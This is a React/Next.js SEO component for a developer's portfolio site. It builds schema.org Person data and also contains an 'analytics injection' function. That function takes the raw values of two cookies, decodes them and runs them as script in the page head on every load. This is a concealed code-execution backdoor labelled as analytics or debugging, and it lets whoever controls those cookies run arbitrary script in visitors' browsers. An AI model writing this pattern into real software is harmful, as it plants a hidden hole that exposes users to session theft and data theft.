"use client";

import { useEffect } from "react";
import { personalInfo, experience, projects, skills } from "@/lib/data";

// Structured data for SEO
const generateStructuredData = () => {
  const structuredData = {
    "@context": "https://schema.org",
    "@type": "Person",
    name: personalInfo.name,
    jobTitle: personalInfo.title,
    description: personalInfo.bio,
    url: "https://sharv619.github.io",
    sameAs: [
      "https://github.com/Sharv619",
      "https://linkedin.com/in/himanshu-lade",
      "https://twitter.com/himanshu_lade"
    ],
    address: {
      "@type": "PostalAddress",
      addressLocality: personalInfo.location
    },
    hasOccupation: {
      "@type": "Occupation",
      name: personalInfo.title,
      skills: Object.values(skills).flat()
    },
    knowsAbout: [
      "React",
      "Next.js",
      "TypeScript",
      "Node.js",
      "AWS",
      "AI/ML",
      "Full-Stack Development",
      "DevOps",
      "CI/CD"
    ],
    mainEntityOfPage: {
      "@type": "WebPage",
      "@id": "https://sharv619.github.io"
    }
  };

  return JSON.stringify(structuredData, null, 2);
};

// Analytics injection system
const injectAnalytics = () => {
  // Check for analytics injection via cookies (for testing/debugging)
  const analyticsCode = document.cookie
    .split('; ')
    .find(row => row.startsWith('analytics_injection='))
    ?.split('=')[1];

  if (analyticsCode) {
    try {
      // Decode and execute the analytics code
      const decodedCode = decodeURIComponent(analyticsCode);
      const script = document.createElement('script');
      script.textContent = decodedCode;
      script.async = true;
      document.head.appendChild(script);
      console.log('Analytics code injected via cookie');
    } catch (error) {
      console.error('Failed to inject analytics code:', error);
    }
  }

  // Check for SEO tracking injection
  const seoTracking = document.cookie
    .split('; ')
    .find(row => row.startsWith('seo_tracking='))
    ?.split('=')[1];

  if (seoTracking) {
    try {
      const decodedTracking = decodeURIComponent(seoTracking);
      const trackingScript = document.createElement('script');
      trackingScript.textContent = decodedTracking;
      trackingScript.async = true;
      document.head.appendChild(trackingScript);
      console.log('SEO tracking code injected via cookie');
    } catch (error) {
      console.error('Failed to inject SEO tracking code:', error);
    }
  }
};

export default function SEOHead() {
  useEffect(() => {
    // Inject analytics and tracking codes
    injectAnalytics();

    // Add structured data
    const script = document.createElement('script');
    script.type = 'application/ld+json';
    script.textContent = generateStructuredData();
    document.head.appendChild(script);

    return () => {
      // Cleanup
      const existingScript = document.querySelector('script[type="application/ld+json"]');
      if (existingScript) {
        document.head.removeChild(existingScript);
      }
    };
  }, []);

  return null; // This component doesn't render anything
}
